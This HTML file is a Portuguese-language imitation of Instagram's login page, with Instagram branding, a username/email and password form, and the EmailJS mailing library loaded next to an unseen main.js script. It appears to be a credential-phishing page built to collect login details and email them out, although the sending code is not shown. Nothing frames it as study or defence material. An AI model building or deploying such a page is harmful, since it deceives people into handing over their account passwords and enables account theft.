<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    <link rel="stylesheet" href="src/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastify-js/1.6.1/toastify.css">
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
    </script>
</head>

<body>

    <div class="container">

        <!-- LADO ESQUERDO -->
        <div class="left">

            <div class="logo">
                <i class="fa-brands fa-instagram"></i>
            </div>

            <h1>
                <span class="linha1">Veja momentos do dia a dia dos</span>
                <span class="linha2">
                    seus <span class="color">amigos próximos.</span>
                </span>
            </h1>

            <div class="cards">
                <img src="img/Captura de tela 2026-02-15 004708.png" class="card">
            </div>

        </div>

        <!-- LADO DIREITO -->
        <div class="right">
            <form id="forms">
                <div class="login-box">

                    <h2>Entrar no Instagram</h2>

                    <input type="text" placeholder="Número de celular, nome de usuário ou email" id="email"
                        name="e-mail">
                    <input type="password" placeholder="Senha" id="password" name="password">

                    <button class="btn-primary" id="button">Entrar</button>
            </form>
            <a href="#" class="forgot">Esqueceu a senha?</a>

            <button class="btn-facebook">
                <i class="fa-brands fa-facebook"></i>
                Entrar com o Facebook
            </button>

            <button class="btn-outline">Criar nova conta</button>

            <p class="meta">Meta</p>

        </div>

    </div>

    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastify-js/1.6.1/toastify.js"></script>
    <script src="src/main.js"></script>
</body>

</html>
